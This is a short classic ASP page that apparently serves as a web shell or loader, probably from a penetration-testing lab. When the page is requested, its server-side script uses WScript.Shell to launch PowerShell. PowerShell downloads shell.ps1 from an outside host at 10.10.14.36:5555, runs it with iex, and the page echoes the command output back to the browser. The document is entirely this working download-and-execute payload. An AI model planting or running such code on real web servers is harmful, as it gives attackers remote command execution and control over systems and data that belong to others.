<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.36:5555/shell.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
